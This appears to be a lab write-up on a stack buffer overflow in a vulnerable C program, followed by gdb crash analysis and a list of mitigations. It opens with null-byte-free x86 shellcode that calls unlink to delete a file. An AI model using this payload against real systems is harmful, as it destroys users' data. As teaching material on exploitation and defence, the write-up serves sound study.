# Run file_del.asm in vuln.c program with buffer overflow

Editing 'file_del.asm' to prevent \x00 string in shellcode:

```
section .text
global _start
_start:
    jmp short ender
starter:
    xor eax, eax
    add al, 8
    add al, 2
    mov ebx, _filename
    int 0x80
_exit:
    xor eax, eax
    add al, 1
    int 0x80

ender:
    call starter
_filename db 'dummyfile'
```


## Lab 2 Script (lab2.sh) - Detailed Error Analysis

The `lab2.sh` script demonstrates a buffer overflow vulnerability in the `vuln` program. Here's a detailed breakdown of the error and its implications:

1. Segmentation Fault:
   ```
   Program received signal SIGSEGV, Segmentation fault.
   0x00000000 in ?? ()
   ```
   This indicates that the program attempted to access memory at address 0x00000000, which is invalid and causes a crash.

2. Register State at Crash:
   ```
   eax            0x0                 0
   ecx            0xffff00bf          0xffff00bf
   edx            0xffffd71b          0xffffd71b
   ebx            0x0                 0
   esp            0xffff00bf          0xffff00bf
   ebp            0x0                 0x0
   esi            0xf7fc9000          0xf7fc9000
   edi            0xf7fc9000          0xf7fc9000
   eip            0x0                 0x0
   eflags         0x10286             [ PF SF IF RF ]
   ```
   Critical observations:
   - EIP (Instruction Pointer) is 0x0, causing the segmentation fault.
   - ESP (Stack Pointer) and EBP (Base Pointer) have been overwritten.
   - Other registers (EAX, EBX) are zeroed out.

3. Stack Examination:
   ```
   (gdb) x/32xw $esp
   0xffff00bf:     0x00000000      0x00000000      0x00000000      0x00000000
   0xffff00cf:     0x00000000      0x00000000      0x00000000      0x00000000
   0xffff00df:     0x00000000      0x00000000      0x00000000      0x00000000
   0xffff00ef:     0x00000000      0x00000000      0x00000000      0x00000000
   0xffff00ff:     0x00000000      0x00000000      0x00000000      0x00000000
   0xffff010f:     0x00000000      0x00000000      0x00000000      0x00000000
   0xffff011f:     0x00000000      0x00000000      0x00000000      0x00000000
   0xffff012f:     0x00000000      0x00000000      0x00000000      0x00000000
   ```
   The stack has been completely overwritten with null bytes (0x00000000).

4. Buffer Overflow Analysis:
   - The original buffer in `vuln.c` was likely smaller than the input provided.
   - The overflow has overwritten the stack, including the return address.
   - The return address (stored in EIP) has been set to 0x0, an invalid address.
   - When the function attempts to return, it tries to execute code at address 0x0, causing the segmentation fault.

5. Exploitation Implications:
   - This vulnerability allows an attacker to control the program's execution flow.
   - By carefully crafting the input, an attacker could potentially execute arbitrary code.
   - In this case, the exploit overwrote critical memory but didn't redirect to shellcode.

6. Security Implications:
   - Demonstrates the danger of using unsafe functions like `strcpy()` without bounds checking.
   - Shows how easily stack-based buffer overflows can corrupt program state.
   - Highlights the importance of stack protection mechanisms and safe coding practices.

7. Debugging Challenges:
   - The complete overwrite of the stack with nulls makes it difficult to analyze the exact payload structure.
   - No clear shellcode is visible in the memory dump, suggesting the exploit might need refinement.

8. Potential Mitigations:
   - Use of stack canaries to detect stack corruption.
   - Implementation of Address Space Layout Randomization (ASLR).
   - Proper bounds checking in the vulnerable function.
   - Using safer alternatives to `strcpy()`, such as `strncpy()` with proper length checks.

This detailed error analysis reveals the successful triggering of a buffer overflow vulnerability, resulting in a complete corruption of the stack and program crash. It underscores the critical nature of such vulnerabilities and the importance of proper security measures in software development.









